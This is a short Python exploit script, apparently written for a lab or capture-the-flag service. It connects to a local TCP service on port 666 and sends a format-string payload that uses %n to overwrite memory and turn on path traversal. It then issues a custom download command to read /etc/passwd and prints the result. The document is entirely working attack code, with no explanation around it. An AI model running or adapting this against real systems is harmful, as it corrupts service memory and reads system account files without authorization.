import socket


def send_cmd(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.0.0.0', 666))
    s.send(payload.encode())

    d = s.recv(1024)
    while d:
        print(d.decode())
        d = s.recv(1024)

if __name__ == '__main__':
    enable_path_traversal = "%lu%lu%lu%lu%lu%216x%n"
    get_passwd_file = "NEF_DOWNLOAD /etc/passwd"


    send_cmd(enable_path_traversal)
    send_cmd(get_passwd_file)